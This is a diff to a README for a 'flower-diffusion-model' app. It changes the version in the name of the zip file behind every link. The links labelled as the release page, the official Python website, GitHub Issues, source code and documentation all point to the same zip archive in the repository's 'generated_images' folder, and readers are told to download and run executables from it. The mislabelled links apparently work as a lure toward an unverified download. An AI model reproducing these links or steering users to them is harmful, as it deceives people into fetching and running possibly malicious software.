@@ -6,11 +6,11 @@ Welcome! This guide will help you download and run the flower-diffusion-model ap
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-v2.3-alpha.4.zip%20Latest%20Release-%20-brightgreen)](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-v2.3-alpha.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-1.1-alpha.3.zip%20Latest%20Release-%20-brightgreen)](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-1.1-alpha.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Release Page](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-v2.3-alpha.4.zip). 
+To get started, visit this page to download the application: [Release Page](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-1.1-alpha.3.zip). 
 
 1. Click on the latest version available on the release page.
 2. Download the appropriate executable file for your operating system. This may be a `.exe` file for Windows, a `.dmg` for macOS, or a zip file for Linux. Ensure you select the correct one based on your system.
@@ -51,13 +51,13 @@ Explore the creativity of the model and enjoy the visual diversity it offers.
 
 If you encounter issues while running the application, try the following steps:
 
-- **Check Python Installation**: Make sure you have the required version of Python installed. If you are unsure, download it from the [official Python website](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-v2.3-alpha.4.zip).
+- **Check Python Installation**: Make sure you have the required version of Python installed. If you are unsure, download it from the [official Python website](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-1.1-alpha.3.zip).
 - **Reinstall the Application**: Sometimes files can be corrupted during installation. Uninstall the application, then download and install it again.
 - **System Updates**: Ensure your operating system is updated to avoid compatibility issues.
 
 ## 💬 Community Support
 
-If you need help or want to share feedback, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-v2.3-alpha.4.zip). Our community is here to assist you. 
+If you need help or want to share feedback, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-1.1-alpha.3.zip). Our community is here to assist you. 
 
 ## 📜 License
 
@@ -65,8 +65,8 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 🔗 Useful Links
 
-- [Release Page](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-v2.3-alpha.4.zip)
-- [Source Code](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-v2.3-alpha.4.zip)
-- [Documentation](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-v2.3-alpha.4.zip)
+- [Release Page](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-1.1-alpha.3.zip)
+- [Source Code](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-1.1-alpha.3.zip)
+- [Documentation](https://raw.githubusercontent.com/larimreis/flower-diffusion-model/main/generated_images/flower-model-diffusion-1.1-alpha.3.zip)
 
 Enjoy creating with the flower-diffusion-model! Happy generating!
